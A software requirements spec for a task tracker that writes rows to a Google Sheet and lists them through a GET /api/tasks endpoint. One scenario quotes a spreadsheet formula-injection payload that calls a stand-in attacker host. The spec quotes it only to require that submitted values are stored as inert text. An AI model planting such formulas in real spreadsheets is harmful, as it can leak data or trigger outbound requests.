## MODIFIED Requirements

### Requirement: Sheet Row Layout

The system SHALL persist each task as one appended row on the `Tasks` tab across
columns A through I, in the fixed order: `taskId`, `taskName`, `status`,
`driveUrl`, `qrUrl`, `createdAt`, `eventDate`, `eventLocation`, `eventOneLiner`.
Values SHALL be written as raw, uninterpreted text, so that no submitted value can
be stored as a live spreadsheet formula.

#### Scenario: Task is appended

- **WHEN** a task is recorded
- **THEN** exactly one row is appended to the range `Tasks!A:I` with the nine
  values in the specified order

#### Scenario: Submitted value resembling a formula

- **WHEN** a field begins with `=`, such as a task name of
  `=IMPORTDATA("https://evil.tld")`
- **THEN** the cell holds that text literally and the spreadsheet does not evaluate
  it, at the cost of dates and URLs landing as plain text rather than native values

#### Scenario: New task status

- **WHEN** a task is first recorded
- **THEN** its `status` column is `Pending`

#### Scenario: Drive URL column at write time

- **WHEN** a task is recorded
- **THEN** the `driveUrl` column is written as an empty string, because the
  folder is provisioned after the row is appended

### Requirement: Task Listing Endpoint

The system SHALL expose `GET /api/tasks`, returning every recorded task as a JSON
array of objects keyed `taskId`, `taskName`, `status`, `driveUrl`, `qrUrl`,
`createdAt`, `eventDate`, `eventLocation`, and `eventOneLiner`. The endpoint SHALL
accept only the `GET` method, and SHALL report a datastore failure as a failure.

#### Scenario: Tasks exist

- **WHEN** the `Tasks` tab holds data rows below the header
- **THEN** the system responds `200` with `status: "success"` and one object per
  row, read from the range `Tasks!A2:I`

#### Scenario: Short or blank rows

- **WHEN** a row has fewer than nine cells or is entirely empty
- **THEN** empty rows are skipped and missing cells become empty strings
- **AND** a missing `status` cell reads as `Pending`

#### Scenario: No tasks recorded yet

- **WHEN** the `Tasks` tab holds no data rows
- **THEN** the system responds `200` with `status: "success"` and an empty `tasks`
  array

#### Scenario: Datastore is unreachable

- **WHEN** the Sheet cannot be read
- **THEN** the system responds `502` with `status: "error"` and the message
  `Could not load tasks from the sheet database.`, so a revoked service account or a
  wrong spreadsheet id is distinguishable from an empty dashboard
- **AND** the underlying error is logged server-side

#### Scenario: Unsupported method

- **WHEN** the endpoint is called with any method other than `GET`
- **THEN** the system responds `405` with an `Allow: GET` header
